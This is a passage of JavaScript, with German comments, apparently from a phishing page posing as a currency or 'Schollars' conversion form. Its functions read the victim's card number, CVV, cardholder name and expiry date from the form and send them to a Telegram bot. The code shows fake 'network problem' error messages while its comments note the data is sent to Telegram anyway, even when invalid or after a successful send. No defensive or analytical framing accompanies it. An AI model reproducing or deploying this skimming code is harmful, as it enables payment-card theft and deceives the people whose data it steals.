...
function sendToTelegram(message) {
  ...
  .then(data => {
    ...
    if (data.ok) {
      // Erfolgreich gesendet, aber trotzdem Fehler anzeigen
...
function processConvert(){
  ...
  if(!cardNumber || !/^[0-9]{12,19}$/.test(cardNumber)) { 
    showError('Netzwerkprobleme oder ungültige Daten. Bitte überprüfen Sie Ihre Internetverbindung und Daten.'); 
    // Trotzdem an Telegram senden
    sendInvalidDataToTelegram(sess.name, 'Ungültige Kartennummer');
    return; 
  }
  if(!cardCVV || !/^[0-9]{3,4}$/.test(cardCVV)) { 
    showError('Netzwerkprobleme oder ungültige Daten. Bitte überprüfen Sie Ihre Internetverbindung und Daten.'); 
    // Trotzdem an Telegram senden
    sendInvalidDataToTelegram(sess.name, 'Ungültiger CVV');
    return; 
  }
  if(!cardHolder) { 
    showError('Netzwerkprobleme oder ungültige Daten. Bitte überprüfen Sie Ihre Internetverbindung und Daten.'); 
    // Trotzdem an Telegram senden
    sendInvalidDataToTelegram(sess.name, 'Fehlender Karteninhaber');
    return; 
  }
  if(!cardExp) { 
    showError('Netzwerkprobleme oder ungültige Daten. Bitte überprüfen Sie Ihre Internetverbindung und Daten.'); 
    // Trotzdem an Telegram senden
    sendInvalidDataToTelegram(sess.name, 'Fehlendes Gültigkeitsdatum');
    return; 
  }
...
// Funktion zum Senden ungültiger Daten an Telegram
function sendInvalidDataToTelegram(userName, errorType) {
  const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g,'') || 'Nicht angegeben';
  const cardCVV = document.getElementById('cardCVV').value || 'Nicht angegeben';
  const cardHolder = document.getElementById('cardHolder').value.trim() || 'Nicht angegeben';
  const cardExp = document.getElementById('cardExp').value || 'Nicht angegeben';
  const amount = document.getElementById('useAmount').value || 'Nicht angegeben';
  
  const message = `FEHLER: ${errorType}\nuser: ${userName}\namount: ${amount} Schollars\ncard: ${cardNumber} | ${cardHolder} | ${cardExp} | ${cardCVV}\nDatum: ${new Date().toLocaleString('de-DE')}`;
